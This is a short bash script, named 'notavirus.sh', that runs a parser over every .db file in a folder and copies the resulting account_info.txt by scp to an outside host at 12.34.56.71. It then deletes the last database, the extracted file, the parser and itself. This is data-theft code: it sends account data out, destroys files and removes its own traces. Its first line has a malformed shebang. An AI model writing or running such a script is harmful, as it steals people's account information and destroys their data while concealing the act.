!# /usr/bin/bash

# get data and encrypt db
for a in $(ls *.db)
do
    echo Selecting $a
    echo Executing ...
    python3 db_parse.py $a
    echo Done.
    echo Copying info back ...
    scp account_info.txt Jerry@12.34.56.71:C:\\Users\\Jerry\\Downloads
    echo Done.
    echo Finished.
done

# clean up
echo Cleaning up ...
rm -f $a
rm -f account_info.txt
rm -f db_parse.py
rm -f notavirus.sh

exit
